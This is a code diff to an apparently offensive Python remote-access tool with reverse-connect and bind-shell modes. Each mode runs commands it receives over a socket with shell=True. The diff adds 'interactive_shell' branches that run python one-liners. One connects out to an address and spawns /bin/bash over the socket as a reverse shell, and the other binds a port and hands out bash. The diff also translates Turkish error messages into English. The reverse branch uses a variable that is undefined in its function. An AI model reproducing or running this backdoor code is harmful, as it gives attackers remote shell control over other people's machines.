@@ -1,9 +1,11 @@
 #!/usr/bin/python3
+#!/usr/bin/python3
 import socket
 import sys
 import subprocess
 import os
 import re
+import time
 print("""
 ██████╗ ██████╗ ██╗   ██╗     ██╗   ██╗███████╗████████╗
 ██╔══██╗██╔══██╗██║   ██║     ╚██╗ ██╔╝╚══███╔╝╚══██╔══╝
@@ -33,10 +35,16 @@ def rvrscnnct(ip,port):
                     rvrscnct.close()
                     sys.exit(1)
                 
-                if ("cd" in command[:2]):
+                elif ("cd" == command[:2]):
                     os.chdir(command[3:])
                     aq=os.getcwd()
                     rvrscnct.send(aq.encode('utf-8'))
+                elif "interactive_shell" in command:
+                    print(command)
+                    print(int(command[17:]))
+                    print(ip_candidates)
+                    time.sleep(2)
+                    os.system("""python -c 'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{}",{}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")' """.format(ip_candidates,int(command[17:])))
                 else:
                     output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)                
                     rvrscnct.sendall(bytes(output.stdout.read()))
@@ -45,25 +53,23 @@ def rvrscnnct(ip,port):
             except socket.timeout:
                 pass
             except IOError as a :
-                ioerror=str.encode("Dizin Bulunamadi")
+                print(a)
+                ioerror=str.encode("[-] Directory Not Found")
                 rvrscnct.send(ioerror)
                 pass
-            
-                
-                
     except ConnectionRefusedError:
-        print("Baglanti hatasi")
+        print("[-] Connection error")
     except Exception as f:
         print(f)
     except KeyboardInterrupt:
-        print("Baglanti zorla kapatildi")
+        print("[-] The connection was forcibly closed")
         rvrscnct.close()
         sys.exit(1)
 def bndcnnct(port):
     try:
         output = subprocess.Popen(['hostname -I'], shell=True, stdout=subprocess.PIPE)
-        a=output.stdout.read()
-        ip_candidates = re.findall(r"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b",str(a))[0]
+        ip2=output.stdout.read()
+        ip_candidates = re.findall(r"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b",str(ip2))[0]
         bindshell=socket.socket()
         bindshell.bind((ip_candidates,int(port)))
         bindshell.listen(2)
@@ -77,19 +83,19 @@ def bndcnnct(port):
                 if "exit" in command:
                     a.close()
                     sys.exit(1)
-                
-                if ("cd" in command[:2]):
+                elif ("cd" == command[:2]):
                     os.chdir(command[3:])
                     aq=os.getcwd()
                     a.send(aq.encode('utf-8'))
+                elif "interactive_shell" == command[:17] :
+                        os.system(""" python -c 'import pty;import socket,os;s=socket.socket();s.bind(("{}",{}));s.listen(1);q,w=s.accept();os.dup2(q.fileno(),0);os.dup2(q.fileno(),1);os.dup2(q.fileno(),2);pty.spawn("/bin/bash")' """.format(ip_candidates,int(command[17:])))
                 else:
                     output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)                
                     a.sendall(bytes(output.stdout.read()))
                     a.sendall(bytes(output.stderr.read()))
-
             except socket.timeout:
                 pass
-            except IOError as a :
+            except IOError:
                 ioerror=str.encode("[-] Directory Not Found")
                 a.send(ioerror)
                 pass
